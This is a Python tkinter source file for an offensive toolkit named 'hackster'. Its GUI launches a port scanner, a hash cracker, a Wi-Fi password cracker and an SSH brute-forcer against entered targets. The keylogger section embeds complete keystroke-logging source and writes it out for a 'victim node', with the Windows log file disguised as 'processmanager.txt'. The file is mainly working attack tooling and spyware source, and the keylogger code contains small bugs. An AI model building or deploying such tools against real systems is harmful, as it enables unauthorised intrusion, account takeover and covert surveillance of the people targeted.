from tkinter import *
import portscanner
import pass_cracker
import wireless_cracker
import sshwthreading
import os

# for testing purposes


def click():
    print("You clicked a button !!")

# function to open portscanner program


def open_port_scanner():
    window = Tk()  # instantiate an instance of a window
    window.geometry("920x120")
    window.minsize(920, 120)
    window.maxsize(920, 120)
    window.title("hackster - portscanner")
    window.config(background="#2a2a2a")
    label = Label(window,
                  text="Port Scanner",
                  font=("Uroob", 40, 'bold'),
                  fg="green",
                  bg="#2a2a2a",
                  )
    label.place(relx=.5, rely=.30, anchor="center")
    frame = Frame(window, bg='#5a5a5a', bd=5)
    frame.place(relx=0.5, rely=0.45, relwidth=0.75, relheight=0.35, anchor='n')

    label_target = Label(frame, font=("Uroob", 20),
                         text="Target(s): ", bg="#5a5a5a", fg="#B7FF31")
    label_target.place(relwidth=.2, relheight=1)
    entry_target = Entry(frame, font=40)
    entry_target.place(relwidth=0.27, relheight=1, relx=.18)

    label_port = Label(frame, font=("Uroob", 20),
                       text="Initial-Port: ", bg="#5a5a5a", fg="#B7FF31")
    label_port.place(relwidth=.2, relheight=1, relx=.45)
    entry_port = Entry(frame, font=40)
    entry_port.place(relwidth=0.06, relheight=1, relx=.65)

    label_range = Label(frame, font=("Uroob", 20),
                        text="Range: ", bg="#5a5a5a", fg="#B7FF31")
    label_range.place(relwidth=.1, relheight=1, relx=.73)
    entry_port_range = Entry(frame, font=40)
    entry_port_range.place(relwidth=0.06, relheight=1, relx=.83)

    button = Button(frame, text="Scan", font=("Uroob", 20), bg="#2a2a2a",
                    fg="#B7FF31", command=lambda: portscanner.scan_mul_targets(str(entry_target.get()), int(entry_port.get()), int(entry_port_range.get())))
    button.place(relx=.9, relheight=1, relwidth=0.1)
    window.mainloop()

# function to open Hash password cracker


def open_pass_cracker():
    window = Tk()  # instantiate an instance of a window
    window.geometry("920x620")
    window.minsize(920, 620)
    window.maxsize(920, 620)
    window.title("hackster - password cracker")
    window.config(background="#2a2a2a")
    label = Label(window,
                  text="Password Cracker",
                  font=("Uroob", 40, 'bold'),
                  fg="green",
                  bg="#2a2a2a",
                  )
    label.place(relx=.5, rely=.10, anchor="center")

    frame = Frame(window, bg='#5a5a5a', bd=5)
    frame.place(relx=0.5, rely=0.15, relwidth=0.75, relheight=.7, anchor='n')

    label_hash_type = Label(frame, font=("Uroob", 20),
                            text="Enter Hash type: ", bg="#5a5a5a", fg="#B7FF31")
    label_hash_type.place(relwidth=.3, relheight=.1,
                          relx=.5, rely=.1, anchor="center")
    entry_hash_type = Entry(frame, font=40)
    entry_hash_type.place(relwidth=0.1, relheight=.1,
                          relx=.5, rely=.18, anchor="center")

    label_pass_file = Label(frame, font=("Uroob", 20),
                            text="Enter password list file: ", bg="#5a5a5a", fg="#B7FF31")
    label_pass_file.place(relwidth=.5, relheight=.1,
                          relx=.5, rely=.3, anchor="center")
    entry_pass_file = Entry(frame, font=40)
    entry_pass_file.place(relwidth=0.5, relheight=.1,
                          relx=.5, rely=.38, anchor="center")

    label_Hash_value = Label(frame, font=("Uroob", 20),
                             text="Enter the value of Hash: ", bg="#5a5a5a", fg="#B7FF31")
    label_Hash_value.place(relwidth=.5, relheight=.1,
                           relx=.5, rely=.5, anchor="center")
    entry_Hash_value = Entry(frame, font=40)
    entry_Hash_value.place(relwidth=0.4, relheight=.1,
                           relx=.5, rely=.58, anchor="center")

    button = Button(frame, text="Find Password", font=("Uroob", 25), bg="#2a2a2a",
                    fg="#B7FF31",
                    command=lambda: pass_cracker.password_cracker(entry_hash_type.get(), entry_pass_file.get(), entry_Hash_value.get()))
    button.place(relx=.5, rely=.8, relheight=.1, relwidth=0.3, anchor="center")

    window.mainloop()

# function to open wifi pass cracker


def open_wireless_cracker():
    window = Tk()  # instantiate an instance of a window
    window.geometry("920x420")
    window.minsize(920, 420)
    window.maxsize(920, 420)
    window.title("hackster - Wifi Password Cracker")
    window.config(background="#2a2a2a")
    label = Label(window,
                  text="Wifi Password Cracker",
                  font=("Uroob", 40, 'bold'),
                  fg="green",
                  bg="#2a2a2a",
                  )
    label.place(relx=.5, rely=.10, anchor="center")

    frame = Frame(window, bg='#5a5a5a', bd=5)
    frame.place(relx=0.5, rely=0.15, relwidth=0.75, relheight=.7, anchor='n')

    label_pass_file = Label(frame, font=("Uroob", 20),
                            text="Enter password file path: ", bg="#5a5a5a", fg="#B7FF31")
    label_pass_file.place(relwidth=.4, relheight=.15,
                          relx=.5, rely=.1, anchor="center")
    entry_pass_file = Entry(frame, font=40)
    entry_pass_file.place(relwidth=0.5, relheight=.15,
                          relx=.5, rely=.25, anchor="center")

    label_ssid = Label(frame, font=("Uroob", 20),
                       text="Enter ssid of the wifi: ", bg="#5a5a5a", fg="#B7FF31")
    label_ssid.place(relwidth=.5, relheight=.15,
                     relx=.5, rely=.45, anchor="center")
    entry_ssid = Entry(frame, font=40)
    entry_ssid.place(relwidth=0.5, relheight=.15,
                     relx=.5, rely=.6, anchor="center")

    button = Button(frame, text="Find Password", font=("Uroob", 20), bg="#2a2a2a",
                    fg="#B7FF31",
                    command=lambda: wireless_cracker.crack_wifi(entry_pass_file.get(), entry_ssid.get()))
    button.place(relx=.5, rely=.8, relheight=.15,
                 relwidth=0.3, anchor="center")
    window.mainloop()

# function to open SSHbruteforcer


def open_SSH_bruteforcer():
    window = Tk()  # instantiate an instance of a window
    window.geometry("920x620")
    window.minsize(920, 620)
    window.maxsize(920, 620)
    window.title("hackster - SSH Bruteforce attacker")
    window.config(background="#2a2a2a")
    label = Label(window,
                  text="SSH Bruteforce Attacker",
                  font=("Uroob", 40, 'bold'),
                  fg="green",
                  bg="#2a2a2a",
                  )
    label.place(relx=.5, rely=.10, anchor="center")

    frame = Frame(window, bg='#5a5a5a', bd=5)
    frame.place(relx=0.5, rely=0.15, relwidth=0.75, relheight=.7, anchor='n')

    label_target = Label(frame, font=("Uroob", 20),
                         text="Target IP address: ", bg="#5a5a5a", fg="#B7FF31")
    label_target.place(relwidth=.3, relheight=.1,
                       relx=.5, rely=.1, anchor="center")
    entry_target = Entry(frame, font=40)
    entry_target.place(relwidth=0.5, relheight=.1,
                       relx=.5, rely=.18, anchor="center")

    label_username = Label(frame, font=("Uroob", 20),
                           text="Enter username: ", bg="#5a5a5a", fg="#B7FF31")
    label_username.place(relwidth=.5, relheight=.1,
                         relx=.5, rely=.3, anchor="center")
    entry_username = Entry(frame, font=40)
    entry_username.place(relwidth=0.4, relheight=.1,
                         relx=.5, rely=.38, anchor="center")

    label_pass_file = Label(frame, font=("Uroob", 20),
                            text="Enter password list file: ", bg="#5a5a5a", fg="#B7FF31")
    label_pass_file.place(relwidth=.5, relheight=.1,
                          relx=.5, rely=.5, anchor="center")
    entry_pass_file = Entry(frame, font=40)
    entry_pass_file.place(relwidth=0.5, relheight=.1,
                          relx=.5, rely=.58, anchor="center")

    button = Button(frame, text="Find Password", font=("Uroob", 25), bg="#2a2a2a",
                    fg="#B7FF31",
                    command=lambda: sshwthreading.start_bruteforce(entry_target.get(), entry_username.get(), entry_pass_file.get()))
    button.place(relx=.5, rely=.8, relheight=.1, relwidth=0.3, anchor="center")

    window.mainloop()

# function to open create a keylogger


def open_keylogger():
    def keylogger_set(path):
        if path != "":
            new_path = path
        write = f"""
from pynput.keyboard import Listener
import os
from sys import platform

keys =[]
count = 0


if platform == "win32":
    path = os.environ['appdata']+'\\\processmanager.txt'

path = '{new_path}'

def on_press(key):
    global keys, count 

    keys.append(key)
    count+=1

    if count >=1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find('backspace') > 0:
                f.write(" Backspace ")
            elif k.find("enter") > 0:
                f.write('\\n')   
            elif k.find("shift") > 0:
                f.write(" Shift ")
            elif k.find("space") > 0:
                f.write(" ")
            elif k.find("caps lock") > 0:
                f.write(" Caps_lock ") 
            elif k.find('key'):
                f.write(k)

if __name__=="__main__":
    with Listener(on_press=on_press) as listener:
        listener.join()
        """
        if os.path.exists("keylogger.py") == False:
            file = open("keylogger.py", 'x')
            file.close()
        file = open("keylogger.py", 'w')
        file.write(write)
        file.close()

    window = Tk()  # instantiate an instance of a window
    window.geometry("920x220")
    window.minsize(920, 220)
    window.maxsize(920, 220)
    window.title("hackster - Keylogger")
    window.config(background="#2a2a2a")
    label = Label(window,
                  text="Keylogger-Setup",
                  font=("Uroob", 40, 'bold'),
                  fg="green",
                  bg="#2a2a2a",
                  )
    label.place(relx=.5, rely=.20, anchor="center")
    path = Label(window, font=("Uroob", 20),
                 text="Enter the folder path of the victim node: ", bg="#5a5a5a", fg="#B7FF31")
    path.place(relwidth=.5, relheight=.15,
               relx=.5, rely=.45, anchor="center")
    path = Entry(window, font=40)
    path.place(relwidth=0.5, relheight=.15,
               relx=.5, rely=.6, anchor="center")

    button = Button(window, text="Set_keylogger", font=("Uroob", 20), bg="#2a2a2a",
                    fg="#B7FF31",
                    command=lambda: keylogger_set(path.get().strip()))
    button.place(relx=.5, rely=.8, relheight=.15,
                 relwidth=0.3, anchor="center")

    window.mainloop()


# main window
if __name__ == "__main__":
    window = Tk()  # instantiate an instance of a window
    window.geometry("820x620")
    window.minsize(620, 980)
    window.maxsize(620, 980)
    window.title("hackster")
    icon = PhotoImage(file="logo.png")
    window.iconphoto(True, icon)
    window.config(background="#2a2a2a")
    label = Label(window,
                  text="Welcome to Hackster",
                  font=("Uroob", 40, 'bold'),
                  fg="green",
                  bg="#2a2a2a",
                  image=icon,
                  compound="bottom"
                  )

    label.place(relx=.5, rely=.35, anchor="center")

    # All the buttons to open repective programs
    start_button = Button(window, text="Port Scanner", command=open_port_scanner, font=(
        "Uroob", 25), fg="green", bg="black", justify="center")
    start_button.place(relx=.5, rely=.65, anchor="center")

    start_button = Button(window, text="Password Hash Cracker", command=open_pass_cracker, font=(
        "Uroob", 25), fg="green", bg="black", justify="center")
    start_button.place(relx=.5, rely=.71, anchor="center")

    start_button = Button(window, text="Wifi Password Cracker", command=open_wireless_cracker, font=(
        "Uroob", 25), fg="green", bg="black", justify="center")
    start_button.place(relx=.5, rely=.77, anchor="center")

    start_button = Button(window, text="SSH_Bruteforce Attacker", command=open_SSH_bruteforcer, font=(
        "Uroob", 25), fg="green", bg="black", justify="center")
    start_button.place(relx=.5, rely=.83, anchor="center")

    start_button = Button(window, text="Keylogger", command=open_keylogger, font=(
        "Uroob", 25), fg="green", bg="black", justify="center")
    start_button.place(relx=.5, rely=.89, anchor="center")

    window.mainloop()  # place window on a computer screen, listen for events
